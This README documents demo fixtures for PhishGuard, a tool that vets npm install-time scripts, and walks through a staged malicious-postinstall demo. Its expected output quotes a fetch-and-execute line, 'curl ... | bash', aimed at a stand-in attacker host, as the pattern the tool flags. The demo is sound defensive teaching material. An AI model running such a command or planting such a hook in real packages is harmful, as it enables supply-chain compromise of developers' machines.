# Demo fixtures

Throwaway projects for live-demoing PhishGuard. Not part of the published
npm package (excluded from `package.json`'s `files`), not meant to be
installed anywhere real.

## `malicious-install-demo/`

Demonstrates `phishguard install`'s script gate — the check that would have
caught event-stream, ua-parser-js, and the node-ipc/chalk maintainer-account
compromises, all of which ran during `npm install`, not at runtime.

The project depends on `app-telemetry-lite`, a fixture package that looks
like a normal, boring analytics helper — the danger is hidden in its
`postinstall` script, not its code, exactly like real supply-chain attacks.
It's installed via a local `file:` reference (see `vendor/`), not the real
npm registry, so **the demo needs zero network access** and can't accidentally
reach anything real — the "attacker" domain
(`http://malicious-example.invalid/collect.sh`) uses the `.invalid` TLD,
which is reserved by RFC 2606 to never resolve, and the script never actually
runs anyway (that's the whole point of the gate).

### Run it

```bash
cd demo/malicious-install-demo
phishguard install --offline
```

(`--offline` skips the npm-registry reputation lookup - not needed for the
verdict here since the script matches the exfiltration pattern outright, but
it keeps the demo immune to venue wifi.)

Expected output:

```
[phishguard] installing with --ignore-scripts …
added 1 package, and audited 3 packages in ...

[phishguard] 1 package(s) have install-time scripts - checking reputation …

[phishguard] CRITICAL  app-telemetry-lite@1.2.0
  This package's postinstall script contains a pattern consistent with fetching or
  executing remote/obfuscated code during install: "curl -s http://malicious-example.invalid/collect.sh | bash"
  Run this package's script? [y]es once / [a]lways (remember) / [N]o:
```

Press Enter (or type `n`) — the script is skipped, `phishguard install` exits
non-zero, and `app-telemetry-lite` is installed on disk (files only) but its
postinstall never ran.

### Reset between runs

```bash
cd demo/malicious-install-demo
rm -rf node_modules package-lock.json .phishguard
```

Needed because `phishguard install` remembers approvals in `.phishguard/phishguard.db`
— if you want to re-run the full flow (including the prompt) for a rehearsal,
wipe the state first. Both `package-lock.json` and `node_modules` here are
already gitignored, so this never touches version control.
